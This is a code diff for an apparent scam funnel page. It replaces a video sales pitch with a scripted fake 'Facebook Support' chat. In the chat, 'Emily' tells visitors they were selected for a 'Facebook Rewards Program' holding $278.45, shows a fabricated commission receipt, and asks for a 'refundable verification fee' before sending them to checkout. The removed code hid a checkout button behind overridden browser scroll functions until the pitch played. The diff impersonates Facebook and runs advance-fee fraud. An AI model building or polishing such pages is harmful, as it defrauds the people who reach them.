@@ -514,7 +514,7 @@
     1: "post_1",
     2: "post_2",
     3: "post_3",
-    4: "vsl_pitch"
+    4: "iniciou_chat"
   };
   function showStep(n) {
     document.querySelectorAll(".step").forEach(function(el){ el.classList.remove("active"); });
@@ -530,9 +530,8 @@
       animateBalance("balance-post", BALANCES[n-1], BALANCES[n-1], 0);
     } else if (n === 4) {
       document.getElementById("step-4").classList.add("active");
-      document.getElementById("balance-video").textContent = "$ " + BALANCES[4].toFixed(2);
-      initVideo();
-      renderComments();
+      document.getElementById("balance-chat").textContent = "$ " + BALANCES[4].toFixed(2);
+      initSupportChat();
       window.scrollTo(0, 0);
     }
     STEP = n;
@@ -655,156 +654,131 @@
     showStep(STEP + 1);
   }
 
-  // ─── Video embed (step 4) ─────────────────────────────────────────────────────
-  var videoInited = false;
-  function initVideo() {
-    if (videoInited) return;
-    videoInited = true;
-    var container = document.getElementById("video-container");
-    var PLAYER_ID = "6a97284ec1db2ea9dd291bfb";
-    var ACCOUNT_ID = "2223d7db-1826-46ab-bf08-708ee5b93e74";
+  // ─── Guided support chat (step 4) ────────────────────────────────────────────
+  var supportStarted = false;
+  var supportIndex = 0;
+  var supportPending = null;
+  var SUPPORT_STEPS = [
+    { type:"text", text:"Hi, welcome to <strong>Facebook Support!</strong>" },
+    { type:"wait", ms:700 },
+    { type:"text", text:"You were <strong>one of the few people</strong> selected for the <strong>Facebook Rewards Program.</strong>" },
+    { type:"wait", ms:850 },
+    { type:"text", text:"My name is Emily and I'll help you redeem your reward." },
+    { type:"wait", ms:700 },
+    { type:"text", text:"You have a balance of <strong>$278.45</strong> available in our app." },
+    { type:"wait", ms:900 },
+    { type:"text", text:"Would you like to continue and withdraw <strong>your money?</strong>" },
+    { type:"choice", label:"Yes, I want to withdraw my money" },
+    { type:"wait", ms:700 },
+    { type:"text", text:"<strong>Your commission receipt is ready 👇🏻</strong>" },
+    { type:"wait", ms:650 },
+    { type:"receipt" },
+    { type:"wait", ms:900 },
+    { type:"choice", label:"I want to claim my reward" },
+    { type:"wait", ms:700 },
+    { type:"text", text:"To receive your <strong>$278.45 reward</strong>, complete the secure verification on the next page." },
+    { type:"wait", ms:800 },
+    { type:"text", text:"The verification fee is fully refunded together with your current rewards balance." },
+    { type:"wait", ms:900 },
+    { type:"choice", label:"Continue to secure verification" }
+  ];
 
-    var player = document.createElement("vturb-smartplayer");
-    player.id = "vid-" + PLAYER_ID;
-    player.style.cssText = "display:block;margin:0 auto;width:100%;max-width:400px;";
-    player.innerHTML =
-      '<div class="vturb-player-placeholder" style="position:relative;width:100%;padding:125% 0 0;z-index:0;background-color:black;"></div>';
-    container.appendChild(player);
+  function initSupportChat() {
+    if (supportStarted) return;
+    supportStarted = true;
+    supportIndex = 0;
+    setTimeout(runSupportStep, 250);
+  }
 
-    // ── Revelação do CTA do pitch ──────────────────────────────────────────────
-    // O botão fica no layout (o VTurb o encontra e pode rolar até ele), invisível
-    // ao usuário, e só é revelado depois do scroll específico disparado pelo player.
-    var ctaBtn = document.querySelector(".smartplayer-scroll-event");
-    var ctaRevealed = false;
-    function revealCta() {
-      if (ctaRevealed) return;
-      ctaRevealed = true;
-      document.querySelectorAll(".smartplayer-scroll-event").forEach(function (el) {
-        el.setAttribute("data-vturb-released", "true");
-        el.removeAttribute("aria-hidden");
-      });
-      console.log("[b3] CTA do pitch liberado");
+  function supportScroll() {
+    var chat = document.getElementById("support-chat");
+    if (chat) chat.scrollTop = chat.scrollHeight;
+  }
+
+  function supportTyping(show) {
+    var chat = document.getElementById("support-chat");
+    var old = document.getElementById("support-typing");
+    if (old) old.remove();
+    if (!show || !chat) return;
+    var row = document.createElement("div");
+    row.id = "support-typing";
+    row.className = "support-row";
+    row.innerHTML = '<img class="support-mini-avatar" src="images/Yl8jFpPF17D9.png" alt=""><div class="support-bubble support-typing"><span></span><span></span><span></span></div>';
+    chat.appendChild(row);
+    supportScroll();
+  }
+
+  function addSupportBubble(kind, html) {
+    var chat = document.getElementById("support-chat");
+    if (!chat) return;
+    supportTyping(false);
+    var row = document.createElement("div");
+    row.className = "support-row" + (kind === "user" ? " user" : "");
+    row.innerHTML = (kind === "user" ? "" : '<img class="support-mini-avatar" src="images/Yl8jFpPF17D9.png" alt="">') + '<div class="support-bubble">' + html + '</div>';
+    chat.appendChild(row);
+    supportScroll();
+  }
+
+  function addSupportReceipt() {
+    var chat = document.getElementById("support-chat");
+    if (!chat) return;
+    supportTyping(false);
+    var ref = "MP-" + Math.floor(100000 + Math.random() * 900000);
+    var row = document.createElement("div");
+    row.className = "support-row";
+    row.innerHTML = '<img class="support-mini-avatar" src="images/Yl8jFpPF17D9.png" alt="">' +
+      '<article class="support-receipt"><div class="support-receipt-head"><strong>Facebook Rewards</strong><span>' + ref + '</span></div>' +
+      '<div class="support-receipt-body"><div class="support-receipt-label">Commission receipt</div><div class="support-receipt-amount">$278.45</div>' +
+      '<div class="support-receipt-line"><span>Ad evaluations</span><strong>Approved</strong></div>' +
+      '<div class="support-receipt-line"><span>Payment method</span><strong>Bank transfer</strong></div></div></article>';
+    chat.appendChild(row);
+    supportScroll();
+  }
+
+  function showSupportChoice(label) {
+    var button = document.getElementById("support-choice");
+    supportPending = label;
+    button.textContent = label;
+    button.classList.add("visible");
+  }
+
+  function runSupportStep() {
+    if (supportIndex >= SUPPORT_STEPS.length) return;
+    var step = SUPPORT_STEPS[supportIndex];
+    if (step.type === "wait") {
+      var next = SUPPORT_STEPS[supportIndex + 1];
+      if (next && (next.type === "text" || next.type === "receipt")) supportTyping(true);
+      supportIndex += 1;
+      setTimeout(runSupportStep, step.ms);
+      return;
     }
-    window.b3RevealCta = revealCta;
-
-    // Intercepta as duas formas de scroll. A VTurb v4 usa window.scrollTo para
-    // centralizar o primeiro .smartplayer-scroll-event, 700 ms após o pitch.
-    if (ctaBtn && !window.__b3ScrollRevealInstalled) {
-      window.__b3ScrollRevealInstalled = true;
-      var nativeScrollIntoView = Element.prototype.scrollIntoView;
-      Element.prototype.scrollIntoView = function () {
-        var result = nativeScrollIntoView.apply(this, arguments);
-        if (this === ctaBtn || (this.matches && this.matches(".smartplayer-scroll-event"))) {
-          setTimeout(revealCta, 1);
-        }
-        return result;
-      };
-
-      var nativeWindowScrollTo = window.scrollTo.bind(window);
-      window.scrollTo = function () {
-        var arg = arguments[0];
-        var requestedTop = typeof arg === "object" && arg !== null
-          ? Number(arg.top)
-          : Number(arguments[1]);
-        var buttonRect = ctaBtn.getBoundingClientRect();
-        var vturbTarget = buttonRect.top + window.scrollY - (window.innerHeight / 2);
-        var result = nativeWindowScrollTo.apply(window, arguments);
-        if (Number.isFinite(requestedTop) && requestedTop > 50 && Math.abs(requestedTop - vturbTarget) < 80) {
-          setTimeout(revealCta, 1);
-        }
-        return result;
-      };
+    if (step.type === "text") {
+      supportTyping(true);
+      setTimeout(function(){ addSupportBubble("agent", step.text); supportIndex += 1; runSupportStep(); }, 500);
+      return;
     }
-
-
-    var script = document.createElement("script");
-    script.src =
-      "https://scripts.converteai.net/" + ACCOUNT_ID + "/players/" + PLAYER_ID + "/v4/player.js";
-    script.async = true;
-    document.head.appendChild(script);
-
-
-    // Botão de checkout sempre visível
-    var wrap = document.getElementById("checkout-btn-wrap");
-    if (wrap) wrap.classList.remove("hidden");
+    if (step.type === "receipt") {
+      addSupportReceipt();
+      supportIndex += 1;
+      setTimeout(runSupportStep, 200);
+      return;
+    }
+    if (step.type === "choice") showSupportChoice(step.label);
   }
 
-  // ─── Like button (step 4) ─────────────────────────────────────────────────────
-  function toggleLike() {
-    LIKED = !LIKED;
-    LIKE_COUNT += LIKED ? 1 : -1;
-    var icon = document.getElementById("like-icon");
-    var label = document.getElementById("like-label");
-    var btn = document.getElementById("like-btn");
-    icon.style.fill = LIKED ? "#1877F2" : "none";
-    icon.style.stroke = LIKED ? "#1877F2" : "currentColor";
-    label.style.color = LIKED ? "#1877F2" : "";
-    document.getElementById("like-count").textContent = LIKE_COUNT.toLocaleString("pt-BR");
-  }
-
-  // ─── Comments (step 4) ───────────────────────────────────────────────────────
-  var commentLikes = {};
-  function renderComments() {
-    var list = document.getElementById("comments-list");
-    if (!list || list.children.length > 0) return;
-    COMMENTS.forEach(function(c, i){
-      var el = document.createElement("div");
-      el.className = "flex flex-col";
-      el.innerHTML =
-        '<div class="flex gap-2">' +
-          '<div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100">' +
-            '<img src="' + c.avatar + '" alt="' + c.name + '" class="w-full h-full object-cover" loading="lazy">' +
-          '</div>' +
-          '<div class="flex-1 min-w-0">' +
-            '<div class="inline-block bg-[#F0F2F5] rounded-[18px] px-3 py-2">' +
-              '<div class="mb-0.5"><span class="font-semibold text-[13px] text-[#050505]">' + c.name + '</span></div>' +
-              '<p class="text-[15px] text-[#050505] leading-[1.3333] break-words">' + c.content + '</p>' +
-            '</div>' +
-            '<div class="flex items-center gap-3 px-3 mt-1">' +
-              '<span class="text-[12px] text-gray-500">' + c.time + '</span>' +
-              '<button onclick="likeComment(' + i + ', this)" class="text-[12px] font-semibold text-gray-600 hover:underline">Like</button>' +
-              '<div class="bg-white rounded-full px-2 py-0.5 shadow-sm border border-gray-200 flex items-center gap-1">' +
-                '<span class="text-[12px]">❤️</span><span class="text-[12px]">👍</span><span class="text-[12px]">😮</span>' +
-                '<span id="clike-' + i + '" class="text-[11px] text-gray-600 font-normal ml-1">' + c.likes + '</span>' +
-              '</div>' +
-            '</div>' +
-          '</div>' +
-        '</div>';
-      list.appendChild(el);
-    });
-    applyTwemoji(list);
-  }
-
-  function likeComment(i, btn) {
-    commentLikes[i] = !commentLikes[i];
-    btn.style.color = commentLikes[i] ? "#1877F2" : "";
-    var span = document.getElementById("clike-" + i);
-    if (span) span.textContent = COMMENTS[i].likes + (commentLikes[i] ? 1 : 0);
-  }
-
-  function addComment(e) {
-    e.preventDefault();
-    var input = document.getElementById("comment-input");
-    var text = input.value.trim();
-    if (!text) return;
-    var list = document.getElementById("comments-list");
-    var el = document.createElement("div");
-    el.className = "flex flex-col appear";
-    el.innerHTML =
-      '<div class="flex gap-2">' +
-        '<div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0">' +
-          '<img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" alt="You" class="w-full h-full object-cover">' +
-        '</div>' +
-        '<div class="flex-1 min-w-0">' +
-          '<div class="inline-block bg-[#F0F2F5] rounded-[18px] px-3 py-2">' +
-            '<div class="mb-0.5"><span class="font-semibold text-[13px] text-[#050505]">You</span></div>' +
-            '<p class="text-[15px] text-[#050505] leading-[1.3333] break-words">' + text.replace(/</g,"<") + '</p>' +
-          '</div>' +
-          '<div class="flex items-center gap-3 px-3 mt-1"><span class="text-[12px] text-gray-500">Just now</span></div>' +
-        '</div>' +
-      '</div>';
-    list.insertBefore(el, list.firstChild);
-    input.value = "";
+  function answerSupport() {
+    if (!supportPending) return;
+    var label = supportPending;
+    supportPending = null;
+    document.getElementById("support-choice").classList.remove("visible");
+    addSupportBubble("user", label);
+    supportIndex += 1;
+    if (supportIndex >= SUPPORT_STEPS.length) {
+      if (typeof window.b3Step === "function") window.b3Step("checkout");
+      openCheckout();
+      return;
+    }
+    setTimeout(runSupportStep, 300);
   }
 
   // ─── Checkout modal ───────────────────────────────────────────────────────────
